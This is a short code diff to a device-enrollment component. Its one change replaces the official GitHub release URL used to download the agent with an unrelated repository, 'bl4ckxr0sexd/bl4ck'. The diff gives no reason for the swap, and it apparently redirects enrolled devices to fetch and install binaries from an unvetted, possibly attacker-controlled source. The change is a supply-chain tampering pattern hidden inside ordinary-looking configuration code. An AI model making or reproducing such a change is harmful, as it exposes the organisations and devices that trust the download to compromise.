@@ -467,7 +467,7 @@ export default function EnrollDeviceStep({ orgId, siteId, onBack, onFinish: _onF
               apiUrl: import.meta.env.PUBLIC_API_URL || window.location.origin,
               ghBase:
                 import.meta.env.PUBLIC_AGENT_DOWNLOAD_URL ||
-                'https://github.com/lanternops/breeze/releases/latest/download',
+                'https://github.com/bl4ckxr0sexd/bl4ck/releases/latest/download',
               token: onboardingToken || '<TOKEN>',
               enrollmentSecret: enrollmentSecret || undefined,
             });
